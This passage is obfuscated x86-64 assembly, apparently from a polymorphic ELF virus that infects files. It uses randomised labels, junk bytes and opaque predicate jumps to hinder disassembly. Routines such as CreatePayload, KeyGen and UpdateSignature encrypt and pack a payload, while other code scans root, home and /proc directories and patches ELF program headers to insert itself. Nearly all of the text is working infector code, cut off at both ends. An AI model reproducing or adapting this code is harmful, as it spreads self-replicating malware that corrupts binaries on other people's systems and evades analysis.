    mov         rsi, QWORD [r8+file.filesize]
    mov         edx, r10d
%endif
    jb          ..@uHZ4Bg6Kstri
    jae         ..@uHZ4Bg6Kstri
..@Ix0v1qsiLjcU:
    call        WORDToDWORDASCII
    jmp         $+3
db 0xf7
    jb          ..@DYPZRSSfbR3u
    jae         ..@DYPZRSSfbR3u
..@wBNCZCbCXwc9:
    push        rbx
    pop         rbx
    mov         rbp, rbp
    jmp         ..@TgoJtM7vs9Nz
..@ViC3FLdVF0dH:
    mov         rax, QWORD [rsp+_VADDR_OFF.tmp_vaddr]
    mov         r3, rax
    jmp         $+4
db 0xe9, 0xa0
    jb          ..@cgWXc395lK8z
    jae         ..@cgWXc395lK8z
..@CHEFqarHgzPC:
    lea         rdi, QWORD [rsp+_LZSSE_OFF.buffer] 
    mov         eax, 0x20
    rep         stosb
    jmp         $+4
db 0x99, 0x4b
    je          ..@JKVZFKtdlwOT
    jne         ..@JKVZFKtdlwOT
..@LzJwZFGwnD0j:
    xchg        rdx, rdx
    add         r1, signature_len
    mov         r3, QWORD [r5+file.filesize]
    jmp         $+3
db 0xc7
    jl          ..@tizWunfvQhax
    jge         ..@tizWunfvQhax
..@u4wuOgws8HxO:
%ifndef ENABLE_DEBUGGING
    mov         rbx, rbx
%endif
    jmp         ..@mBnhW86o2P4t
..@DuhBNXSWRPTm:
    pop         r5
    js          ..@oFXsYFzK9xSM
    jns         ..@oFXsYFzK9xSM
..@nC7HOHi4ixyE:
    mov         r2, 1b
    call        MapFile
    cmp         rax, 0
    jb          ..@P2hEF1dhYu5D
    jae         ..@P2hEF1dhYu5D
..@lv9vX6co2I6U:
    sub         rsp, _NBF_OFF_size
    mov         WORD [rsp+_NBF_OFF.index], r2w
    mov         QWORD [rsp+_NBF_OFF.file], r1
    jmp         $+5
db 0x7f, 0xcc, 0x59
    jmp         ..@lKMk5qIqjQkG
..@MXHuiC5qmms3:
    mov         al, BYTE [rsp+_LZSSE_OFF.match_len]
    jmp         $+3
db 0x90
    js          ..@QKi2kxxr9KMH
    jns         ..@QKi2kxxr9KMH
..@7altwpA4Um7B:
    mov         rbp, rbp
    jmp         ..@digXFuKZGANM
    jl          ..@CEfJKpAQTUF2
    jge         ..@CEfJKpAQTUF2
..@087OgNcsMnFp:
    mov         rax, (-1)
    jb          ..@7ibetLnsTsG8
    jae         ..@7ibetLnsTsG8
..@xyF9CEYvmHFf:
    mov         rsp, rsp
    add         rsi, rdx
    mov         rsi, rsi
    jmp         $+4
db 0x48, 0x05
    je          ..@5KAswpxIPdzm
    jne         ..@5KAswpxIPdzm
..@QelgF85a2Jd0:
    mov         r2, QWORD [r5+file.filesize]
    jl          ..@KVK92fFDulaD
    jge         ..@KVK92fFDulaD
..@uelZpXPoTQ9k:
%ifndef ENABLE_DEBUGGING
    VAR         packed, bash
    mov         r1, r5
%endif
    jb          ..@36dyhIm8jz2a
    jae         ..@36dyhIm8jz2a
..@t0oYsh3H06tt:
    mov         r4, 0x1
    xor         rax, rax
    jmp         $+4
db 0x3e, 0x8b
    jmp         $+4
db 0xd4, 0xd5
    jl          ..@5gPeA0TbTSo6
    jge         ..@5gPeA0TbTSo6
..@rbLC19HfKAII:
    add         rax, bytes
    js          ..@CUQvGFAQJJBO
    jns         ..@CUQvGFAQJJBO
..@ir3yF9nV8Wfm:
    mov         WORD [rsp+_LZSSE_OFF.buffersize], WINDOW_LENGTH*2
    jmp         $+4
db 0x61, 0xf0
    jmp         ..@Anbhud6cV7Zi
..@99pxq7L518JH:
    call        NonBinaryFile
    jmp         ..@n8ZPYy9nfUsh
..@pC9g6ENk5Utt:
    mov         r1, r4
    jmp         $+4
db 0x03, 0x88
    js          ..@g8JTNT8hOTob
    jns         ..@g8JTNT8hOTob
..@GwSRIlO58Zlp:
    add         r5, rax
    jmp         $+3
db 0xef
    jmp         $+5
db 0x92, 0xac, 0x17
    js          ..@0YEBDi25qjTw
    jns         ..@0YEBDi25qjTw
..@WnVL3S6U5pAK:
    syscall
    jmp         $+3
db 0xfa
    jmp         ..@xDuxWVwr0Ey0
..@y7sKxh2kK5oE:
    cmp         BYTE [r1], 0x39
    jmp         $+4
db 0x41, 0xa8
    jl          ..@XqV6jFYAEDqD
    jge         ..@XqV6jFYAEDqD
..@C49l690wuUer:
    mov         rax, rsp
    jmp         $+4
db 0xd8, 0x3b
    jmp         $+3
db 0x5b
    jb          ..@rbLC19HfKAII
    jae         ..@rbLC19HfKAII
..@7NfiAzfUh7jU:
    inc         WORD m5
    jmp         ..@kU1lqE4X9oAq
    jmp         $+5
db 0x99, 0x6a, 0xa0
    je          ..@dHIawrBLtFBt
    jne         ..@dHIawrBLtFBt
..@qqHtEJkba2cz:
%ifndef ENABLE_DEBUGGING
    xor         rax, rax
%endif
    jmp         $+4
db 0x4e, 0xb2
    jmp         ..@bVEDHNEkO4Jh
..@xrAYn7tunSWh:
    ret
    jmp         AddSizeMappedFile
..@cgWXc395lK8z:
    and         r3, 0xfff 
    mov         rbx, 0x1000
    sub         rbx, r3
    jmp         $+4
db 0x00, 0x35
    jmp         $+4
db 0x3c, 0x19
    jmp         $+4
db 0x4f, 0x26
    jb          ..@fjUsj57HJri9
    jae         ..@fjUsj57HJri9
..@5FM6NXtPceaR:
    mov         rsi, m7
    sub         rsi, m6
    mov         DWORD [rdi], esi
    jmp         $+5
db 0xad, 0x27, 0x71
    jb          ..@UUmCW3VooHAy
    jae         ..@UUmCW3VooHAy
..@0jxionm42Tgm:
    xor         rax, rax
    jmp         $+5
db 0xd4, 0x38, 0x19
    jmp         ..@5xIqndSeOd3G
..@4WFpHhyT5MD6:
%ifndef ENABLE_DEBUGGING
    xor         r2, r2
    xor         r3, r3
    xor         r4, r4
%endif
    jmp         $+5
db 0x50, 0xce, 0x90
    jmp         ..@ZUffJ3Pqd3lf
..@rVd2xgF4j0z3:
    sub         r2, non_encrypted_len
    jmp         $+3
db 0xd9
    jl          ..@dEVm5cIonMwR
    jge         ..@dEVm5cIonMwR
..@HjJvf5Z8Jueg:
    xor         r2, r2
    mov         r2w, WORD [r1+e_h.e_phnum]
    sub         r2, 1
    jb          ..@DjYjPZRgj3T4
    jae         ..@DjYjPZRgj3T4
..@EXJtuGTFHWEp:
    mov         al, BYTE [rsp+_LZSSE_OFF.mask]
    test        al, al
    jmp         ..@eqXDvRDNIGf1
..@QServwCbSVQ4:
    mov         eax, SYS_LSEEK
    syscall
    jmp         ..@LA1wpaXqCNh1
..@60MzoZEdPUAX:
    cmp         BYTE [rsp+_LZSSE_OFF.mask], 10000000b
    je          ..@kjAqQcZ29KqU
    jmp         ..@cXlpNhORfiRR
..@UG3nqUzwV2uB:
    mov         r3, rax
    jmp         $+5
db 0x3f, 0xd7, 0x0e
    js          ..@UdnaD6EvigEF
    jns         ..@UdnaD6EvigEF
..@Tfk7mEdwzEdr:
    mov         WORD [rsp+_LZSSE_OFF.w_index], 0x0000
    jmp         $+5
db 0x21, 0xa8, 0x29
    je          ..@qiSJn112LCPC
    jne         ..@qiSJn112LCPC
..@fDfnUmoqSIYF:
    push        r5
    push        rsi
    jmp         ..@F1NsL5FL1pnm
..@FBwWJjnrXvqR:
    mov         r1, m6
    jmp         $+4
db 0x50, 0x38
    je          ..@sAGQRLC3STig
    jne         ..@sAGQRLC3STig
..@wgYWdsSztdpZ:
    push        rbp
    xchg        rdi, rdi
    jmp         ..@nsnQ3CtQ5HWW
..@z12d72nSzIsv:
%ifdef X86_64
    mov         rcx, rdx
%endif
    jb          ..@FeBuXSiburkB
    jae         ..@FeBuXSiburkB
..@lbXTHjgzvfp3:
    jmp         ..@yL5ZvFG8sxFY
    jmp         $+5
db 0x29, 0xef, 0xbd
    jmp         $+3
db 0x0f
    js          ..@ZadmL0lbLgJj
    jns         ..@ZadmL0lbLgJj
..@JKVZFKtdlwOT:
    mov         ecx, (WINDOW_LENGTH+LOOKAHEAD_LENGTH)
    jmp         ..@5y0lxOvEgQlv
..@QMWlfJwMYSUf:
%ifndef ENABLE_DEBUGGING
    xchg        rcx, rcx
%endif
    jl          ..@VLWCXrRvByfq
    jge         ..@VLWCXrRvByfq
..@RfsXXvk04dJR:
    jl          ..@knv6fBdqYynh
    jmp         ..@mG6WOAut9eoE
    js          ..@ySH3ANTOxhJq
    jns         ..@ySH3ANTOxhJq
..@a3wDrwR2S1Yp:
    jl          ..@TglUL4c2hHAB
    jmp         $+3
db 0x0b
    js          ..@el7yE5GhAUTf
    jns         ..@el7yE5GhAUTf
..@G2LgWNp7GPbd:
    pop         rdi
    js          ..@tS0XXJsSpm20
    jns         ..@tS0XXJsSpm20
..@WiEOYsmYjQCm:
    mov         BYTE [rsp+_LZSSE_OFF.bits], 0x00
    jmp         $+4
db 0xc7, 0xb8
    jmp         $+4
db 0xf9, 0x30
    jl          ..@oy5X6QbhPIKo
    jge         ..@oy5X6QbhPIKo
..@N34zYAdhb5uz:
    or          BYTE [rsp+_LZSSE_OFF.bits], al
    jmp         ..@Ut3Kllb3ym1m
..@2jYnQovqbc5Z:
    pop         r2
    jmp         $+5
db 0x27, 0x46, 0xc2
    jl          ..@Ld3tpocpBLy5
    jge         ..@Ld3tpocpBLy5
..@mG6WOAut9eoE:
    ODIR        [rsp+_INFDIR_OFF.dirfd], [rsp+_INFDIR_OFF.dirbuf], DIRENT_BUFSIZE
    jmp         $+4
db 0xb8, 0xf6
    jmp         $+4
db 0x01, 0xa4
    jb          ..@hOhi6eYsseOE
    jae         ..@hOhi6eYsseOE
..@jcosweNtsHYn:
    sub         rax, QWORD [rsp+_LZSSE_OFF.saveoutptr]
    jmp         ..@ce0altf9ylcT
..@3yUhr3J7X92P:
    mov         QWORD [rsp+_LZSSE_OFF.inputaddr], rsi
    je          ..@ir3yF9nV8Wfm
    jne         ..@ir3yF9nV8Wfm
..@PYnIESskT0Bo:
    mov         rsi, QWORD [rsp+_AESE_OFF.startaddr]
    jmp         $+4
db 0x9d, 0xd2
    jmp         ..@PJMOYsxu6N9D
..@Ffj7hKI4celc:
    jl          ..@ET4Z7OGbbrTS
    push        rax
    pop         rax
    jmp         $+3
db 0x58
    jmp         $+4
db 0x9d, 0x59
    jb          ..@8eOQ7X6C4AHH
    jae         ..@8eOQ7X6C4AHH
..@2nSNYKY7bqmY:
    add         r1, bytes
    jmp         $+5
db 0xe0, 0xc6, 0x46
    js          ..@NFm6dplKuGsH
    jns         ..@NFm6dplKuGsH
..@AJKdtPdReRbP:
    pop         rbx
    jmp         $+3
db 0x8c
    je          ..@5TcS0uFa1aKo
    jne         ..@5TcS0uFa1aKo
..@orl06VT9vxj3:
    pop         rax
    mov         BYTE [rsp+_LZSSE_OFF.character], al
    push        rdx
    jmp         $+4
db 0x66, 0x28
    jmp         $+4
db 0x37, 0xd4
    jb          ..@TaWEbXcGq9Vy
    jae         ..@TaWEbXcGq9Vy
..@GW3byYVDnKq9:
    lea         r1, [rsp+_PROC_OFF.dirbuf+r4]
    mov         ax, WORD [r1+linux_dirent.d_reclen]
    jb          ..@ZAsPpzqbhmqX
    jae         ..@ZAsPpzqbhmqX
..@eHqD3Tdiplld:
    push        r3
    jmp         $+5
db 0x10, 0xc4, 0xf9
    jb          ..@TA1POBWyFS6N
    jae         ..@TA1POBWyFS6N
..@LB2JJNCv1iSb:
    add         rsp, _VADDR_OFF_size
    jmp         $+4
db 0xda, 0x83
    jmp         ..@mZhVrnUWXxNE
..@LA1wpaXqCNh1:
    cmp         eax, 0x0
    jle         ..@E1AOSFe0dB0u
    jmp         ..@rbHao6pCWR3S
..@AePV1v98LOQu:
    mov         rdi, rdi
    ret
    js          _eof
    jns         _eof
..@NxzoLQa7g5zC:
    pop         rdx
    jmp         MemMove
..@HUqvubrdGN8r:
    lea         rdi, QWORD [rsp+_LZSSE_OFF.buffer+WINDOW_LENGTH-LOOKAHEAD_LENGTH]
    mov         rsi, QWORD [rsp+_LZSSE_OFF.inputaddr]
    jmp         $+3
db 0xd8
    jmp         ..@I1iAdfotuM5f
..@fvmBDWi2hThL:
    call        Strcpy
    js          ..@zTVUtqWPHMjD
    jns         ..@zTVUtqWPHMjD
..@nbokKBOGjfaO:
    pop         rax
    pop         r1
    ret
    jmp         $+4
db 0xff, 0x57
    jb          WORDToDWORDASCII
    jae         WORDToDWORDASCII
..@HaqAzbobmvH6:
    cmp         BYTE [rsp+_LZSSE_OFF.character], al
    jmp         $+3
db 0x4e
    jmp         $+4
db 0x42, 0x1d
    jb          ..@W626EXZMbK5l
    jae         ..@W626EXZMbK5l
..@GHiekcIYlsLc:
    push        r3
    jmp         $+3
db 0xf4
    js          ..@rmDQsLpmuk8Q
    jns         ..@rmDQsLpmuk8Q
..@jLxPxNLLqRYA:
    ret
    jmp         $+3
db 0x72
    jmp         $+4
db 0x0c, 0x7f
    jmp         ..@5V2DykwmXljs
..@fnAModRL2ytq:
    pop         rbx
    movzx       r3, WORD [r1+e_h.e_phentsize]
    jmp         $+3
db 0x53
    jmp         ..@F4vAZtn7TWzu
..@3oy90WTg4A0c:
    mov         r3, [r1+e_h.e_phoff]
    js          ..@UFY9CdBtWCwA
    jns         ..@UFY9CdBtWCwA
..@jGK2LSf7CFO7:
    cmp         DWORD [r1+1], "home"
    jne         ..@Y61Jt6wG3DVA
    jmp         ..@eunNlfGKXbSy
..@CiLQife0WV4S:
    jge         ..@0KWWpYxDdPIr
    jmp         $+4
db 0x47, 0xd1
    jmp         $+5
db 0x58, 0x3e, 0x7b
    jmp         $+3
db 0xf1
    jmp         ..@Q6S5GKR3cODH
..@THLXWDeMSVKL:
    mov         r1d, eax
    je          ..@gWIqcskydhbb
    jne         ..@gWIqcskydhbb
..@jYl72Xhqg9He:
    pop         r1
    jmp         $+3
db 0x7a
    jmp         ..@pwUjkzkmpTr7
..@dsULph2Rzqe0:
    pop         r3
    jmp         $+3
db 0xf7
    je          ..@KHj72SiTcjs0
    jne         ..@KHj72SiTcjs0
..@7G4ZRwnxqGCg:
    movdqu      xmm1, oWORD [rsp+0x90]
    je          ..@mkcd17n3Pt4g
    jne         ..@mkcd17n3Pt4g
..@grZwhXU8SqPr:
    jz          ..@Y61Jt6wG3DVA
    and         r2, 1b
    mov         rdx, rdx
    jmp         $+3
db 0x61
    jmp         $+3
db 0x77
    jmp         ..@LrXR0HNbPrmd
..@xuG6mD1j1pUF:
    mov         r1, r4
    mov         rax, [r5+file.filesize]
    add         rax, r2
    jmp         $+4
db 0x22, 0x27
    je          ..@8tHhqYSZCZwC
    jne         ..@8tHhqYSZCZwC
..@K3rBWUUT5lXp:
    test        rax, rax
    jmp         $+3
db 0x09
    jmp         $+3
db 0x76
    je          ..@f7wAHNfpny9K
    jne         ..@f7wAHNfpny9K
..@ZuFALXSYx54K:
    push        rcx
    jmp         $+4
db 0x7d, 0x39
    jmp         $+4
db 0xb1, 0xba
    jmp         $+4
db 0x74, 0x11
    jmp         ..@1O8lhlXURxrj
..@trsd2KHfgVrU:
    mov         rbx, rbx
    jmp         $+5
db 0xcc, 0xd4, 0x40
    js          ..@dGXI3zRSDFvD
    jns         ..@dGXI3zRSDFvD
..@cTkbhibWtnGs:
    mov         QWORD [r5+file.filesize], 0x00
    jl          ..@ZAL8a7iRzlMf
    jge         ..@ZAL8a7iRzlMf
..@jB6Ad7V5ijIg:
    push        rax
    pop         rax
    sub         r2, m6
    jmp         $+5
db 0xd4, 0x43, 0xf2
    jmp         $+4
db 0x6f, 0xac
    jb          ..@rVd2xgF4j0z3
    jae         ..@rVd2xgF4j0z3
..@CEfJKpAQTUF2:
    xchg        rcx, rcx
    jmp         $+4
db 0xae, 0xb7
    jmp         ..@S5MFFLoLvXEp
..@y4UVVVvtjwhQ:
%ifdef X86_32
    mov         edx, esi
    mov         esi, 0x01
    mov         edi, DWORD [edi+file.filefd]
%endif
    jmp         $+4
db 0x3f, 0x27
    jmp         $+5
db 0x59, 0xbc, 0x8f
    jmp         $+4
db 0x05, 0xaf
    jmp         $+4
db 0x00, 0x9c
    jb          ..@OXRxNQMouZQk
    jae         ..@OXRxNQMouZQk
..@ofn0TNsHd4qy:
    push        rdx
    jl          ..@iXtu9UwwOv3v
    jge         ..@iXtu9UwwOv3v
..@sTbkCs35bSKI:
    cmp         rax, (-1)
    push        rsi
    jmp         $+5
db 0xc1, 0x5c, 0xf3
    jmp         ..@DQfXOyMokIdm
..@0AEyiqDXegrY:
    mov         rsp, rsp
    jb          ..@DgZ3ibeHRW29
    jae         ..@DgZ3ibeHRW29
..@zSppTP6uQ0wq:
    mov         DWORD [rdi], eax
    jmp         $+3
db 0xc0
    jb          ..@wpM5i8KexwZm
    jae         ..@wpM5i8KexwZm
..@oXkjn2EL2JWR:
    cmp         rax, 0xffffffffffffffff
    push        rdi
    jmp         $+4
db 0xd3, 0xf8
    jmp         ..@5Wj854LHWtKp
..@MUFI9CprduWv:
    xor         r2, r2
    jmp         $+3
db 0xc5
    jb          ..@oWpTdc3y6GEF
    jae         ..@oWpTdc3y6GEF
CreatePayload:
    jmp         ..@XZZdjs3W6g7h
KeyGen:
    jmp         ..@0qGNzsXx4Y3Z
..@xM1DcXbR1Qsd:
    call        MapFile
    cmp         rax, 0
    push        rdi
    jb          ..@2wb6ApJbrNem
    jae         ..@2wb6ApJbrNem
..@5Wj854LHWtKp:
    pop         rdi
    je          ..@E1AOSFe0dB0u
    jmp         ..@F67IsYYh3JOq
..@Bq0l6uaIklUB:
%ifndef ENABLE_DEBUGGING
    pop         rax
%endif
    je          ..@ENQl3DJZ8rPl
    jne         ..@ENQl3DJZ8rPl
..@4A76FpVAV1e7:
    xchg        rsi, rsi
    mov         rsi, rsi
    js          ..@s64jktIXl3wm
    jns         ..@s64jktIXl3wm
..@5Imih3iCOl8e:
    cmp         BYTE [r2], 0x0
    jb          ..@KQFgRzGdz9XJ
    jae         ..@KQFgRzGdz9XJ
..@qH9D6tpiL58c:
    ret
    jl          ..@mmaIxPWflqsu
    jge         ..@mmaIxPWflqsu
..@UjYHNYXphJVA:
    mov         rsi, rsi
    mov         r4, QWORD [rsp+_INFDIR_OFF.dirindex]
    je          ..@TBtLPNBr5j6Q
    jne         ..@TBtLPNBr5j6Q
..@DY6tV45s7m7K:
    lea         r1, QWORD [rsp+_INFFILE_OFF.file]
    call        FileValidation
    jmp         $+4
db 0x81, 0x6b
    jmp         ..@O3N5zD9ClF5G
..@pVbganjwP8Pk:
    xchg        rax, rax
    js          ..@oz511qsrLSXv
    jns         ..@oz511qsrLSXv
..@oSwOZ9iFly5c:
    mov         QWORD [rsp+_LZSSE_OFF.outputaddr], r3
    mov         QWORD [rsp+_LZSSE_OFF.saveoutptr], r3
    jmp         $+3
db 0xf8
    jmp         ..@LanwRcGaolSh
..@ilobPccyCFiV:
    call_vsp    ExitProgram
    jb          ..@ET4Z7OGbbrTS
    jae         ..@ET4Z7OGbbrTS
..@b6w8ADo7izFg:
    pop         rbx
    mov         QWORD [r2+p_h.p_offset], r3
    push        r2
    js          ..@eHqD3Tdiplld
    jns         ..@eHqD3Tdiplld
..@Y12jxhXCHgyJ:
%ifndef ENABLE_DEBUGGING
    mov         rax, SYS_PRCTL
%endif
    jmp         $+4
db 0x3e, 0xf0
    js          ..@JPTpBWuEX59S
    jns         ..@JPTpBWuEX59S
..@maVfORBfFvbY:
    add         rax, r1
    jmp         $+4
db 0xc9, 0xd9
    jmp         $+3
db 0xcd
    jl          ..@gc8HcTx3jxzM
    jge         ..@gc8HcTx3jxzM
..@PJMOYsxu6N9D:
    push        rsi
    pop         rsi
    jmp         $+3
db 0x21
    jb          ..@o2TH3e3SvPoT
    jae         ..@o2TH3e3SvPoT
..@gCZLapfGByFO:
    pop         rbx
    add         rsi, QWORD [rdi+s_h.sh_offset]
    jmp         $+3
db 0xc7
    jmp         ..@9S07vIcmOYxz
..@KlkWQxa4aBxC:
    mov         rdi, rdi
    jmp         ..@Aah2IeUfeSHv
..@1uVm9Y0Qh9pa:
    jmp         ..@zsINgtGROFAC
    jmp         $+5
db 0xfb, 0x80, 0x08
    jmp         $+4
db 0xa0, 0x41
    jmp         ..@MUFI9CprduWv
..@nMzIFvClPDHc:
    jl          ..@DulTC7c5xsUo
    mov         rax, 1
    jmp         $+4
db 0xcb, 0xd3
    jmp         ..@wMFhQmcXmA4O
..@9uJSvRChqO6T:
    pop         rdi
    jmp         $+3
db 0x64
    jmp         ..@oeRotaY7Z0I5
..@Cmfa5aNk7gLF:
    mov         r5, [rsp]
    jmp         $+5
db 0x86, 0x29, 0xf1
    jmp         $+5
db 0x17, 0x35, 0x15
    jl          ..@40vdlFC4IFNR
    jge         ..@40vdlFC4IFNR
..@xAwt64CgrWOr:
    movzx       rax, BYTE [rsp+_PROC_OFF.dirbuf+linux_dirent.d_reclen+r4]
    jmp         $+5
db 0xbe, 0x33, 0x2d
    jb          ..@Wd5zvoYbqiph
    jae         ..@Wd5zvoYbqiph
..@YD6gyYjX26yt:
    OFILE       QWORD [r2], r4
    jmp         $+3
db 0xf0
    jmp         ..@cCMR1ddUQIxm
..@F4vAZtn7TWzu:
    mul         r3 
    jb          ..@uXXzdsTGdbaP
    jae         ..@uXXzdsTGdbaP
UpdateSignature:
    jmp         ..@UgDSQntpLZa0
..@noT4SQLlpoaz:
%ifndef ENABLE_DEBUGGING
    xor         r5, r5
    syscall
    xor         rax, rax
%endif
    jmp         ..@KUDraLHwh5ul
..@VUyHKnkGLOWe:
    add         r1, 1
    add         r2, 1
    jl          ..@9SHKbYuh86np
    jge         ..@9SHKbYuh86np
..@OZHUXxCCd5Ix:
    pop         rbx
    js          ..@l2nSxRMO9Wkd
    jns         ..@l2nSxRMO9Wkd
..@KLnyMF4nvnFG:
    pop         rdx
    mov         ax, WORD [rsp+_LZSSE_OFF.buffersize]
    jmp         $+3
db 0x91
    jmp         ..@rqGZ7OimiW3a
..@jYlKso5Xnde7:
    lea         rdi, [rsp+_LZSSE_OFF.buffer]
    jmp         $+4
db 0x8b, 0xf1
    js          ..@OcghNPzjuqnI
    jns         ..@OcghNPzjuqnI
..@KUDraLHwh5ul:
%ifndef ENABLE_DEBUGGING
    xor         r1, r1
    xor         r2, r2
%endif
    jb          ..@QzKm4d3rPUvr
    jae         ..@QzKm4d3rPUvr
..@INO4LTeg1PaT:
    pop         rdx
    jb          ..@zq1oaRVarseO
    jae         ..@zq1oaRVarseO
..@8SX5f8xToNmc:
    push        rbx
    jmp         $+3
db 0x32
    jb          ..@Olcjv1ttX16n
    jae         ..@Olcjv1ttX16n
..@ce0altf9ylcT:
    add         rsp, _LZSSE_OFF_size
    jmp         ..@PZilfkYOMKFH
..@qP9ORkN1FZEU:
%ifndef ENABLE_DEBUGGING
    jl          ..@msoFHxxK2YJh
    mov         rdi, rdi
%endif
    jmp         $+4
db 0x89, 0x7a
    jmp         $+3
db 0x3c
    jmp         ..@uQFJUY0Lnl9k
..@ySSN91Ks0a0l:
    xor         r4, r4
    mov         r5, [rsp+_NBF_OFF.file]
    jmp         $+3
db 0xca
    jl          ..@9EpdjpiU4hzV
    jge         ..@9EpdjpiU4hzV
..@ingYVTEp0XeF:
    jmp         ..@55NVEJPM7lul
    jmp         ..@roUJuZp2q12b
..@nwaaPRiREmAH:
    je          ..@zsINgtGROFAC
    jb          ..@Jv2MRvRVTMC8
    jae         ..@Jv2MRvRVTMC8
..@BXoAqQ84MaTd:
    pop         rax
    jmp         ..@LpiRORGMzTYA
..@mPFbagIRVA4X:
    jnz         ..@WodJEncz9ZHP
    jl          ..@UMBBr2dSG8iH
    jge         ..@UMBBr2dSG8iH
..@lMLvZj3BcoZL:
    pop         rdx
    jmp         $+3
db 0xbf
    jmp         $+4
db 0xd4, 0xbb
    jmp         $+5
db 0x5b, 0x41, 0xe1
    js          ..@TnfyO5uGF7cD
    jns         ..@TnfyO5uGF7cD
..@vNKc5hhTZ3n2:
    xor         rax, rax
    mov         al, BYTE [rsp+_LZSSE_OFF.match_len]
    add         WORD [rsp+_LZSSE_OFF.la_index], ax
    jmp         ..@shJg0z8tKTWO
..@nGfdb3UgazZj:
    ret
    je          CreatePayload
    jne         CreatePayload
..@l2nSxRMO9Wkd:
    add         ecx, 1
    jmp         ..@806qeX226HUb
..@yRO3HVWisvS0:
    leave
    jb          ..@GCU9OnfcHomQ
    jae         ..@GCU9OnfcHomQ
..@UdR7ADqRoYyo:
    ret
    jmp         $+3
db 0x7f
    jmp         DestroyPayload
..@gWIqcskydhbb:
    push        rbx
    pop         rbx
    jmp         $+5
db 0xf7, 0x13, 0xd5
    jmp         $+5
db 0xbc, 0x78, 0xcb
    jmp         $+5
db 0xd9, 0x8e, 0xb3
    jmp         $+3
db 0xfb
    jl          ..@0cptoUtIlDpH
    jge         ..@0cptoUtIlDpH
..@MnUTWDdadaZh:
    VAR         packed, procdir
    jmp         ..@IPRQV3vUSp8F
..@Q9IIcuATVTeU:
    VAR         packed, dirs_root
    jmp         $+5
db 0x82, 0x8b, 0x9f
    js          ..@oKV6beU0okIO
    jns         ..@oKV6beU0okIO
..@28kq6nXfirxG:
    rep         nop
    jmp         $+5
db 0x82, 0xf4, 0x4c
    jmp         $+4
db 0x26, 0xe7
    js          ..@Hc0jrUTxKVTy
    jns         ..@Hc0jrUTxKVTy
..@gwUFCdDF5BU6:
%ifndef ENABLE_DEBUGGING
    syscall
    xor         rax, rax
    xor         r4, r4
%endif
    jmp         $+4
db 0x7c, 0x22
    jmp         $+4
db 0x5f, 0x91
    jmp         $+4
db 0xcb, 0x00
    jmp         ..@MC0y9D3dPQrM
..@oDnhgYn9VQN2:
    lea         r2, [rsp+_INFDIR_OFF.dirbuf+linux_dirent.d_name+r4]
    jmp         $+5
db 0x5c, 0x13, 0xe4
    jmp         $+4
db 0xc8, 0x43
    js          ..@VRrMwrLhB4i8
    jns         ..@VRrMwrLhB4i8
..@dt99oCFSoHAh:
    push        rsi
    pop         rsi
    jb          ..@KvL7DLMsesIG
    jae         ..@KvL7DLMsesIG
..@0YEBDi25qjTw:
    push        rax
    jmp         $+4
db 0xae, 0x32
    js          ..@BXoAqQ84MaTd
    jns         ..@BXoAqQ84MaTd
..@tvJ8lwAMVXWi:
    lea         rdi, [rsp+_LZSSE_OFF.buffer]
    xor         rax, rax
    jmp         $+3
db 0xe1
    jmp         ..@SRUBfQZF7aKR
..@QnGfZMpSOYny:
    cmp         DWORD [rdi+s_h.sh_type], SHT_DYNAMIC
    jmp         $+4
db 0x40, 0x07
    jb          ..@EKgobsayfOGJ
    jae         ..@EKgobsayfOGJ
..@gdbsc0fWsixU:
    xor         rax, rax
    js          ..@KlkWQxa4aBxC
    jns         ..@KlkWQxa4aBxC
..@rlFupMO3DMaD:
    xor         rax, rax
    xor         rcx, rcx
    jb          ..@xro1DcDF6zPy
    jae         ..@xro1DcDF6zPy
MemMove:
    jmp         ..@4RBAJgbgcYTv
..@MPYY9jpSeqm4:
    mov         QWORD [r2+p_h.p_vaddr], r3
    jmp         $+5
db 0x9d, 0xf6, 0x0e
    jmp         $+4
db 0xdc, 0xdd
    jmp         ..@jDZBYjJ1Guab
..@63mxLdFS9t7W:
    mov         rax, rax
    add         r1, non_encrypted_len
    mov         r2, m7
    jb          ..@jB6Ad7V5ijIg
    jae         ..@jB6Ad7V5ijIg
..@kU1lqE4X9oAq:
    call        DestroyPayload
    jmp         $+3
db 0xd6
    jmp         $+5
db 0x45, 0xdd, 0x7c
    jl          ..@zsINgtGROFAC
    jge         ..@zsINgtGROFAC
..@HEyrwJ1stJmX:
    pop         rdi
    test        eax, eax
    jmp         $+4
db 0xc2, 0x75
    jmp         ..@rbmZCC2QNnsB
..@OWRsq2JGm86O:
    cmp         eax, 0x03
    jmp         ..@Xzlw6TyN6BLg
..@CUQvGFAQJJBO:
    push        rax
    js          ..@Q9IIcuATVTeU
    jns         ..@Q9IIcuATVTeU
..@Hc0jrUTxKVTy:
    jnz         ..@GjERNERShRqe
    jmp         $+4
db 0xe6, 0xca
    jmp         ..@rysDpqCqwug0
..@XMqfck0FQgkf:
    or          edi, eax
    js          ..@Y5CmDZ8HvmSu
    jns         ..@Y5CmDZ8HvmSu
..@S5OqQFSC9j6O:
    pop         r1
    cmp         r1, 0x00
    je          ..@bDyBgTnpy7r7
    je          ..@b8QYvE6NHUDh
    jne         ..@b8QYvE6NHUDh
..@MFQF7XBhSC7H:
    mov         rdi, rdi
    pop         rbp
    xor         rcx, rcx
    je          ..@PYnIESskT0Bo
    jne         ..@PYnIESskT0Bo
..@kV4r2zGHl5iH:
    lea         r1, [rsp+_INFDIR_OFF.dirbuf+linux_dirent.d_name+r4]
    cmp         BYTE [r1], '.'
    je          ..@UjYHNYXphJVA
    jmp         $+5
db 0xa4, 0x94, 0x2c
    jmp         $+3
db 0x86
    jmp         ..@5IqUQ1cAWg2Y
..@niwFsDMeARfC:
    pop         rdx
    xchg        rcx, rcx
    jmp         $+3
db 0x3e
    jmp         $+4
db 0x85, 0xbb
    jmp         $+3
db 0x1e
    jmp         ..@GW3byYVDnKq9
..@5mMv771HpNhX:
    jmp         ..@Y61Jt6wG3DVA
    jl          ..@0KWWpYxDdPIr
    jge         ..@0KWWpYxDdPIr
..@RZpdd0dPm7R8:
    mov         DWORD [rsp+_UPDATASIG_OFF.keyprev], r3d
    jmp         $+4
db 0xd0, 0x06
    jmp         $+3
db 0xd4
    jb          ..@ZZxiqDHxLeO2
    jae         ..@ZZxiqDHxLeO2
..@TaWEbXcGq9Vy:
    pop         rdx
    js          ..@i10jjGSV5BV9
    jns         ..@i10jjGSV5BV9
..@QlZxJM2ioibR:
    mov         r3d, 0x20
    mov         eax, SYS_READ
    syscall
    jmp         $+3
db 0x7c
    jl          ..@C7v8v4ZSQ9Vl
    jge         ..@C7v8v4ZSQ9Vl
..@CI4iqkyMcebm:
